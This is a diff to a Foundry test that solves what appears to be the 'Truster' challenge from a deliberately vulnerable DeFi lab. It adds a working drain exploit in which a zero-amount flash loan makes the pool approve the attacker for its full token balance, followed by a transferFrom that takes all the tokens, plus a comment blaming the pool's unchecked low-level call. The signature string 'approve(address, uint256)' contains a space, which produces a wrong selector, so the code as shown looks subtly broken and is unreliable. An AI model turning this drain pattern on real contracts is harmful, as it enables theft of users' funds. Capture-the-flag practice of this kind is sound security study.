@@ -41,12 +41,15 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
-        vm.startPrank(attacker);
+        uint256 balance = dvt.balanceOf(address(trusterLenderPool));
+
+        vm.prank(attacker);
         trusterLenderPool.flashLoan(
-            0, attacker, address(dvt), abi.encodeWithSignature("approve(address, uint256)", attacker, TOKENS_IN_POOL)
+            0, attacker, address(dvt), abi.encodeWithSignature("approve(address, uint256)", attacker, balance)
         );
-        dvt.transfer(attacker, TOKENS_IN_POOL);
-        vm.stopPrank();
+
+        vm.prank(attacker);
+        dvt.transferFrom(address(trusterLenderPool), attacker, balance);
         /**
          * EXPLOIT END *
          */
@@ -60,3 +63,6 @@ contract Truster is Test {
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
     }
 }
+
+// Exploit: in TrusterLenderPool contract there is functionCall() function which performs a low-level call
+// Therefore, an attacker can simply approve the tokens present in the pool and take all.
